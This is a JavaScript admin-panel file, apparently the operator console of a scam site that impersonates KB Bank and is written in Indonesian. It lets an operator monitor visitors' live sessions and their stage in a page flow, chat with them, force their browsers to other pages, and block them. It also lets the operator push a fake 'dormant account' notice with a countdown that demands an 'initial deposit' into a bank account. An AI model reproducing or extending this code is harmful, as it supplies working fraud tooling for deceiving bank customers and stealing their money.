(() => {
  'use strict';
  const listEl=document.getElementById('sessionList');
  const messagesEl=document.getElementById('messages');
  const titleEl=document.getElementById('chatTitle');
  const subEl=document.getElementById('chatSub');
  const form=document.getElementById('replyForm');
  const input=document.getElementById('replyInput');
  const button=document.getElementById('replyBtn');
  const navTarget=document.getElementById('navTarget');
  const navSend=document.getElementById('navSend');
  const accessToggle=document.getElementById('accessToggle');
  const navStatus=document.getElementById('navStatus');
  const baseTitle=document.title;
  const firebaseStatus=document.getElementById('firebaseStatus');
  const logoutAdmin=document.getElementById('logoutAdmin');
  const dormantForm=document.getElementById('dormantEditorForm');
  const dormantTitleInput=document.getElementById('dormantAdminTitle');
  const dormantMessageInput=document.getElementById('dormantAdminMessage');
  const dormantNoticeTitleInput=document.getElementById('dormantAdminNoticeTitle');
  const dormantNoticeBodyInput=document.getElementById('dormantAdminNoticeBody');
  const dormantMinutesInput=document.getElementById('dormantAdminMinutes');
  const dormantSave=document.getElementById('dormantAdminSave');
  const dormantReset=document.getElementById('dormantAdminReset');
  const dormantStatus=document.getElementById('dormantAdminStatus');
  const dormantOpen=document.getElementById('dormantOpen');
  const dormantModal=document.getElementById('dormantAdminModal');
  const dormantClose=document.getElementById('dormantAdminClose');
  let firebaseConnected=false;
  let runtime=null;
  let sessions=[];
  let selectedUid='';
  let selectedSessionId='';
  let messages=[];
  let stopMessages=null;
  let stopSessions=null;
  let stopDormantConfig=null;
  let audioContext=null;
  let notificationsArmed=false;
  let permissionAsked=false;
  const lastUnread=new Map();
  let initialSnapshot=true;

  const short=value=>String(value||'').slice(-8)||'-';
  const fmt=value=>{const d=new Date(value);return Number.isNaN(d.getTime())?'-':d.toLocaleString('id-ID',{hour:'2-digit',minute:'2-digit',second:'2-digit'})};
  const newId=()=>crypto?.randomUUID?.()||`admin-${Date.now()}-${Math.random().toString(16).slice(2)}`;
  const selectedSession=()=>sessions.find(s=>s.firebaseUid===selectedUid)||null;
  const DEFAULT_DORMANT=Object.freeze({
    title:'INFORMASI REKENING DORMANT',
    message:'Pemeriksaan mendeteksi status rekening dormant. Pemindahan saldo belum bisa di proses.',
    noticeTitle:'Informasi Rekening',
    noticeBody:'Rekening memerlukan verifikasi status sebelum proses dapat dilanjutkan. harap melakukan Pengisian saldo perdana ke rekening utama kb bank anda',
    countdownSeconds:7200
  });
  const dormantInputs=[dormantTitleInput,dormantMessageInput,dormantNoticeTitleInput,dormantNoticeBodyInput,dormantMinutesInput].filter(Boolean);

  function setDormantEditorEnabled(enabled){
    dormantInputs.forEach(el=>{el.disabled=!enabled});
    if(dormantSave)dormantSave.disabled=!enabled;
    if(dormantReset)dormantReset.disabled=!enabled;
    if(dormantOpen)dormantOpen.disabled=!enabled;
  }
  function renderDormantConfig(value){
    const cfg=value||DEFAULT_DORMANT;
    if(dormantTitleInput)dormantTitleInput.value=cfg.title||DEFAULT_DORMANT.title;
    if(dormantMessageInput)dormantMessageInput.value=cfg.message||DEFAULT_DORMANT.message;
    if(dormantNoticeTitleInput)dormantNoticeTitleInput.value=cfg.noticeTitle||DEFAULT_DORMANT.noticeTitle;
    if(dormantNoticeBodyInput)dormantNoticeBodyInput.value=cfg.noticeBody||DEFAULT_DORMANT.noticeBody;
    if(dormantMinutesInput)dormantMinutesInput.value=String(Math.max(1,Math.round(Number(cfg.countdownSeconds||7200)/60)));
  }

  async function armNotifications(){
    if(notificationsArmed)return;
    try{audioContext=new (window.AudioContext||window.webkitAudioContext)();await audioContext.resume();notificationsArmed=true;}catch{}
    if(!permissionAsked&&'Notification'in window&&Notification.permission==='default'){
      permissionAsked=true;try{await Notification.requestPermission()}catch{}
    }
  }

  function sound(){
    if(!notificationsArmed||!audioContext)return;
    try{
      const osc=audioContext.createOscillator();const gain=audioContext.createGain();
      osc.frequency.setValueAtTime(880,audioContext.currentTime);
      gain.gain.setValueAtTime(.0001,audioContext.currentTime);
      gain.gain.exponentialRampToValueAtTime(.16,audioContext.currentTime+.015);
      gain.gain.exponentialRampToValueAtTime(.0001,audioContext.currentTime+.22);
      osc.connect(gain);gain.connect(audioContext.destination);osc.start();osc.stop(audioContext.currentTime+.24);
    }catch{}
  }

  function notifySession(s){
    sound();
    if(document.visibilityState==='visible'&&document.hasFocus())return;
    if('Notification'in window&&Notification.permission==='granted'){
      try{new Notification('Pesan Live Chat baru',{body:`Sesi ${short(s.id)}`,tag:`kb-firebase-chat:${s.firebaseUid}`,renotify:true,silent:true})}catch{}
    }
  }

  function updateTitle(){
    const total=sessions.reduce((n,s)=>n+Math.max(0,Number(s.adminUnread||0)),0);
    document.title=total>0?`(${total}) ${baseTitle}`:baseTitle;
  }

  function renderSessions(){
    listEl.innerHTML='';
    if(!sessions.length){listEl.innerHTML=`<div class="empty">${firebaseConnected?'Firebase terhubung. Belum ada user aktif. Buka website dari HP atau tab lain untuk membuat sesi.':'Menghubungkan ke Firebase…'}</div>`;updateTitle();return;}
    sessions.forEach(s=>{
      const btn=document.createElement('button');btn.type='button';btn.className=`session${selectedUid===s.firebaseUid?' active':''}`;
      const strong=document.createElement('strong');const name=document.createElement('span');name.textContent=`Sesi ${short(s.id)}`;strong.appendChild(name);
      if(Number(s.adminUnread||0)>0){const c=document.createElement('span');c.className='count';c.textContent=String(s.adminUnread);strong.appendChild(c)}
      const meta=document.createElement('small');const stale=Date.now()-new Date(s.lastAt).getTime()>45000;const offline=s.status==='offline'||stale;
      const dot=document.createElement('span');dot.className=`dot${offline?' offline':''}`;meta.appendChild(dot);
      meta.append(document.createTextNode(`${offline?'Offline':'Online'}${s.blocked?' • DIBLOKIR':''} • ${s.flowPage||'-'} • Tahap ${Number(s.flowStep||0)} • ${fmt(s.lastAt)}`));
      btn.append(strong,meta);btn.addEventListener('click',()=>selectSession(s.firebaseUid));listEl.appendChild(btn);
    });
    updateTitle();
  }

  function renderMessages(){
    messagesEl.innerHTML='';
    if(!selectedUid){messagesEl.innerHTML='<div class="empty">Pilih sesi chat di sebelah kiri.</div>';return;}
    if(!messages.length){messagesEl.innerHTML='<div class="empty">Belum ada pesan pada sesi ini.</div>';return;}
    for(const m of messages){
      const row=document.createElement('div');row.className=`row ${m.author==='admin'?'admin':'user'}`;
      const bubble=document.createElement('div');bubble.className='bubble';bubble.append(document.createTextNode(m.text));
      const time=document.createElement('span');time.className='time';time.textContent=`${m.author==='admin'?'Admin Simulasi':'Pengguna'} • ${fmt(m.at)}`;
      bubble.appendChild(time);row.appendChild(bubble);messagesEl.appendChild(row);
    }
    messagesEl.scrollTop=messagesEl.scrollHeight;
  }

  async function selectSession(uid){
    selectedUid=uid;const s=selectedSession();if(!s)return;
    selectedSessionId=s.id;titleEl.textContent=`Sesi ${short(s.id)}`;subEl.textContent=`${s.flowPage||'-'} • Tahap ${Number(s.flowStep||0)}${s.blocked?' • DIBLOKIR':''}`;
    input.disabled=false;button.disabled=!input.value.trim();navTarget.disabled=false;navSend.disabled=Boolean(s.blocked);accessToggle.disabled=false;
    accessToggle.textContent=s.blocked?'Buka Blokir':'Blokir User';accessToggle.classList.toggle('unblock',Boolean(s.blocked));
    if(s.flowPage&&[...navTarget.options].some(o=>o.value===s.flowPage))navTarget.value=s.flowPage;
    navStatus.textContent='';messages=[];renderSessions();renderMessages();
    if(stopMessages){try{stopMessages()}catch{}stopMessages=null;}
    stopMessages=await runtime.listenAdminMessages(uid,list=>{messages=list;renderMessages();void runtime.markAdminRead(uid);});
    await runtime.markAdminRead(uid);input.focus();
    if(stopDormantConfig){try{stopDormantConfig()}catch{}stopDormantConfig=null;}
    setDormantEditorEnabled(true);
    if(dormantStatus)dormantStatus.textContent='Memuat konfigurasi dormant…';
    stopDormantConfig=await runtime.listenAdminDormantConfig(uid,value=>{renderDormantConfig(value);if(dormantStatus)dormantStatus.textContent=value?'Konfigurasi khusus sesi ini aktif.':'Menggunakan konfigurasi default.';});
  }

  function onSessions(next){
    const incoming=Array.isArray(next)?next:[];
    for(const s of incoming){
      const prev=lastUnread.get(s.firebaseUid);
      const current=Math.max(0,Number(s.adminUnread||0));
      if(!initialSnapshot&&prev!==undefined&&current>prev)notifySession(s);
      lastUnread.set(s.firebaseUid,current);
    }
    sessions=incoming;initialSnapshot=false;renderSessions();
    if(selectedUid){
      const s=selectedSession();
      if(s){subEl.textContent=`${s.flowPage||'-'} • Tahap ${Number(s.flowStep||0)}${s.blocked?' • DIBLOKIR':''}`;navSend.disabled=Boolean(s.blocked);accessToggle.textContent=s.blocked?'Buka Blokir':'Blokir User';accessToggle.classList.toggle('unblock',Boolean(s.blocked));}
    }
  }

  input.addEventListener('input',()=>{button.disabled=!selectedUid||!input.value.trim()});
  form.addEventListener('submit',async event=>{
    event.preventDefault();if(!selectedUid)return;const text=input.value.trim().slice(0,500);if(!text)return;
    button.disabled=true;const ok=await runtime.sendAdminMessage(selectedUid,selectedSessionId,{id:newId(),text});
    if(ok){input.value='';button.disabled=true;}else{button.disabled=!input.value.trim();}
    input.focus();
  });

  function openDormantEditor(){
    if(!selectedUid||!dormantModal)return;
    dormantModal.hidden=false;
    document.documentElement.style.overflow='hidden';
    setTimeout(()=>dormantTitleInput?.focus(),0);
  }
  function closeDormantEditor(){
    if(!dormantModal)return;
    dormantModal.hidden=true;
    document.documentElement.style.overflow='';
  }
  dormantOpen?.addEventListener('click',openDormantEditor);
  dormantClose?.addEventListener('click',closeDormantEditor);
  dormantModal?.addEventListener('click',event=>{if(event.target===dormantModal)closeDormantEditor();});
  window.addEventListener('keydown',event=>{if(event.key==='Escape'&&dormantModal&&!dormantModal.hidden)closeDormantEditor();});

  dormantForm?.addEventListener('submit',async event=>{
    event.preventDefault();
    if(!selectedUid)return;
    const minutes=Math.max(1,Math.min(1440,Math.round(Number(dormantMinutesInput?.value)||120)));
    const payload={
      title:String(dormantTitleInput?.value||'').trim(),
      message:String(dormantMessageInput?.value||'').trim(),
      noticeTitle:String(dormantNoticeTitleInput?.value||'').trim(),
      noticeBody:String(dormantNoticeBodyInput?.value||'').trim(),
      countdownSeconds:minutes*60
    };
    if(!payload.title||!payload.message||!payload.noticeTitle||!payload.noticeBody){if(dormantStatus)dormantStatus.textContent='Semua kolom notifikasi wajib diisi.';return;}
    if(dormantSave)dormantSave.disabled=true;
    if(dormantStatus)dormantStatus.textContent='Menyimpan…';
    const ok=await runtime.saveAdminDormantConfig(selectedUid,payload);
    if(dormantStatus)dormantStatus.textContent=ok?'Notifikasi dormant tersimpan realtime.':'Gagal menyimpan konfigurasi.';
    if(dormantSave)dormantSave.disabled=!selectedUid;
  });

  dormantReset?.addEventListener('click',async()=>{
    if(!selectedUid)return;
    dormantReset.disabled=true;
    if(dormantStatus)dormantStatus.textContent='Mengembalikan default…';
    const ok=await runtime.resetAdminDormantConfig(selectedUid);
    if(ok)renderDormantConfig(null);
    if(dormantStatus)dormantStatus.textContent=ok?'Konfigurasi dikembalikan ke default.':'Gagal mengembalikan konfigurasi.';
    dormantReset.disabled=!selectedUid;
  });

  navSend.addEventListener('click',async()=>{
    const s=selectedSession();if(!s)return;if(s.blocked){navStatus.textContent='User sedang diblokir. Buka blokir sebelum memindahkan halaman.';return;}
    const target=String(navTarget.value||'').trim();navSend.disabled=true;navStatus.textContent='Mengirim perintah perpindahan...';
    const ok=await runtime.navigateUser(selectedUid,target);navStatus.textContent=ok?`Perintah dikirim: ${target}`:'Perintah gagal dikirim.';navSend.disabled=Boolean(selectedSession()?.blocked)||!selectedUid;
  });

  accessToggle.addEventListener('click',async()=>{
    const s=selectedSession();if(!s)return;const blocked=!Boolean(s.blocked);accessToggle.disabled=true;navStatus.textContent=blocked?'Memblokir user...':'Membuka blokir user...';
    const ok=await runtime.setBlocked(selectedUid,blocked);navStatus.textContent=ok?(blocked?'User berhasil diblokir.':'Blokir user berhasil dibuka.'):'Perintah gagal dikirim.';accessToggle.disabled=!selectedUid;
  });

  async function init(){
    try{
      if(firebaseStatus){firebaseStatus.textContent='Menghubungkan Firebase…';firebaseStatus.className='badge';}
      await Promise.resolve(window.KBFirebaseBoot);runtime=window.KBFirebaseRuntime;
      if(!runtime?.isAdminConfigured?.()){location.replace('admin-login-firebase.html');return;}
      const admin=await runtime.requireAdmin();if(!admin){location.replace('admin-login-firebase.html');return;}
      setDormantEditorEnabled(false);
      stopSessions=await runtime.listenAdminSessions(onSessions);
      firebaseConnected=true;
      if(firebaseStatus){firebaseStatus.textContent='Firebase Terhubung';firebaseStatus.className='badge ok';}
      renderSessions();
    }catch(err){
      firebaseConnected=false;
      if(firebaseStatus){firebaseStatus.textContent='Firebase Gagal Terhubung';firebaseStatus.className='badge error';}
      listEl.innerHTML='<div class="empty">Koneksi Firebase gagal. Periksa konfigurasi atau Authentication.</div>';
      console.error(err);
    }
  }

  logoutAdmin?.addEventListener('click',async()=>{try{await runtime?.signOutAdmin?.()}finally{location.replace('admin-login-firebase.html')}});

  const arm=()=>{void armNotifications()};
  window.addEventListener('pointerdown',arm,{once:true,capture:true});window.addEventListener('keydown',arm,{once:true,capture:true});
  window.addEventListener('pagehide',()=>{document.documentElement.style.overflow='';try{stopSessions?.()}catch{}try{stopMessages?.()}catch{}try{stopDormantConfig?.()}catch{}});
  void init();
})();
